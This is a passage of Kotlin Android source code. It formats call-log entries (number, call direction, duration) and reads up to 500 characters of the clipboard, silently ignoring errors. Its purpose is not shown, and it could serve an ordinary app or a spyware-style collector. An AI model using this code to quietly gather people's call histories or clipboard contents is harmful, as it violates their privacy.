            val type = when (c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE))) {
                CallLog.Calls.INCOMING_TYPE -> "in"
                CallLog.Calls.OUTGOING_TYPE -> "out"
                CallLog.Calls.MISSED_TYPE -> "miss"
                else -> "?"
            }
            "$num ($type) ${c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION))}s"
        }
    )

    private fun getClipboard(): String {
        try {
            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clip = cm.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text?.toString()
                if (text != null && text.isNotBlank()) {
                    return text.take(500)
                }
            }
        } catch (_: Exception) {}
        return "(empty)"
    }
}
